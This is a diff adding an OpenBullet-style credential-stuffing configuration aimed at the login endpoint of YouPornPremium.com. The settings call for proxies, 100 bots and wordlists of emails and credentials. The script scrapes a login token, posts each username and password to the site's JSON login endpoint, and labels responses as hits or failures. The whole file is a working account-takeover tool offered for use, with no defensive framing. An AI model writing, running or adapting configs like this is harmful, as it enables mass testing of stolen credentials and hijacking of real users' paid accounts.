@@ -1,0 +1,52 @@
+[SETTINGS]
+{
+  "Name": "YouPorn Premium",
+  "SuggestedBots": 100,
+  "LastModified": "2019-07-13T12:58:57.9331736+02:00",
+  "AdditionalInfo": "",
+  "Author": "Hyacintho",
+  "Version": "1.0.2",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "Email",
+  "AllowedWordlist2": "Credentials",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.youpornpremium.com/account/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Token PARSE "<SOURCE>" LR "value=\"" "\">" -> VAR "TOKEN" 
+
+#Login REQUEST POST "https://www.youpornpremium.com/account/login_json?token=<TOKEN>" 
+  CONTENT "token=<TOKEN>&loginPage=1&redirectExpired=https%3A%2F%2Fwww.youpornpremium.com%2Faccount%2Fexpired&redirect=&from=pc_white_label_login&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "text/html; charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: www.youpornpremium.com" 
+  HEADER "Origin: https://www.youpornpremium.com" 
+  HEADER "Referer: https://www.youpornpremium.com/account/login" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username\\/password" 
+    KEY "\"success\":\"0\"" 
+  KEYCHAIN Success OR 
+    KEY "\"success\":\"1\"" 
+
